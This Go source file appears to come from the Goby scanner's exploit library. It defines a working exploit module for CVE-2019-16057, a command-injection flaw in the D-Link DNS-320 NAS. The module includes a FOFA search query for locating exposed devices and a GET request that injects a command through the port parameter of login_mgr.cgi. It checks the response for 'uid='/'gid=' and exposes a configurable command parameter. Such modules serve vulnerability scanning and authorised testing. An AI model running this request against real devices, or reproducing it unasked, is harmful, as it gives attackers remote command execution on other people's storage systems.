package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "D-Link DNS-320 login_mgr.cgi RCE (CVE-2019-16057)",
    "Description": "The login_mgr.cgi script in D-Link DNS-320 through 2.05.B10 is vulnerable to remote command injection.",
    "Impact": "D-Link DNS-320 login_mgr.cgi RCE (CVE-2019-16057)",
    "Recommendation": "<p>upgrade</p>",
    "Product": "D-Link DNS-320",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "D-Link DNS-320 login_mgr.cgi 命令执行漏洞 CVE-2019-16057",
            "Description": "<p>D-Link DNS-320是中国台湾友讯（D-Link）公司的一款NAS（网络附属存储）设备。</p><p>D-Link DNS-320 2.05.B10及之前版本中的login_mgr.cgi脚本存在操作系统命令注入漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">D-Link DNS-320 2.05.B10及之前版本中的login_mgr.cgi脚本存在操作系统命令注入漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：</p><p><a target=\"_Blank\" href=\"https://www.dlink.com/\">https://www.dlink.com/</a></p>",
            "Product": "D-Link DNS-320",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "D-Link DNS-320 login_mgr.cgi RCE (CVE-2019-16057)",
            "Description": "The login_mgr.cgi script in D-Link DNS-320 through 2.05.B10 is vulnerable to remote command injection.",
            "Impact": "D-Link DNS-320 login_mgr.cgi RCE (CVE-2019-16057)",
            "Recommendation": "<p>upgrade</p>",
            "Product": "D-Link DNS-320",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\")",
    "GobyQuery": "(body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\")",
    "Author": "B1anda0",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2021-06-02",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2019-16057"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2019-16057"
    ],
    "CNVD": [
        "CNVD-2019-39557"
    ],
    "CNNVD": [
        "CNNVD-201909-727"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username=",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username=",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10218"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
